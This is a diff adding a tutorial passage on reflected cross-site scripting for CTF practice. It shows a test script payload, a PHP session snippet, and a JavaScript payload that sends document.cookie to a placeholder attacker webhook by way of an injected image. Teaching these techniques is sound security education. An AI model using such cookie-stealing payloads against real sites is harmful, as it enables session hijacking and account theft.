@@ -55,3 +55,35 @@ Also, you can find payloads to play with at [HTML5 Security Cheatsheet](http://h
     </body>
    </html>
    ```  
+   supplying 
+   ```javascript
+   <script>console.log(1)</script>
+   ``` 
+   as input will be reflected in the webpage, thus the name **reflected Cross Site Scripting**  
+   Of course writing to the console is boring, however this proves that we have code execution the context of the browser, an attacker may then leverage the full capabilities of JS with the ability to steal JS-accessible cookies which is usually the case for a session hijacking attack.  
+   Read more about cookies and scoping [here](https://developer.mozilla.org/fr/docs/Web/API/Document/cookie)  
+   Let's make our first payload. However, we will need some kind of session cookie. This can be done by  
+   ```php
+   <?php
+   // Starting session
+   // this will create cookies
+   // you can them by viting the developer tools  
+   session_start();
+   ?>
+   ```
+   The session_start() function first checks to see if a session already exists by looking for the presence of a session ID. If it finds one, i.e. if the session is already started, it sets up the session variables and if doesn't, it starts a new session by creating a new session ID.  
+   [official manual](https://www.php.net/manual/fr/function.session-start.php)  
+   To our first test, let's try to steal the cookies:
+   payload:
+   ```javascript
+   let element = document.createElement("img");
+   element.setAttribute("src", "webhookurl/?"+document.cookie);
+   document.body.appendChild(element);
+   ```  
+   The example above, gets the document cookie and appends it to the url of an attacker's controlled webhook.  
+   _Note: Don't forget to urlencode_  
+   for more advanced attack vectors try HTTP parameter pollution.  
+   Read about that [here](https://www.owasp.org/index.php/4.8.1_Test_de_Reflected_Cross-Site_Scripting_(OTG-INPVAL-001))  
+   Its time for you to go to rootme and play.  
+   Additional for CTF creation: 
+   **Check PhantomJS the scriptable headless browser, or selenium on python if you want to automate the behavior of a user**  
